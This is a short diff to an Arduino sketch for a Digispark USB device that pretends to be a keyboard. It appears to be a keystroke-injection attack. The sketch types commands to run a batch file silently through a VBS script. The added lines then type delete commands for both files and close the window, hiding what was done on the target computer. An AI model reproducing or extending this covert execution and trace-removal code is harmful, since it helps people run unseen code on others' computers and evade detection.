@@ -53,6 +53,12 @@ void setup() {
   DigiKeyboard.print("Wscript @silent.vbs@ @run.bat@");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
+   DigiKeyboard.print("del silent.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+   DigiKeyboard.print("del run.bat");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
   digitalWrite(1, LOW);
 }
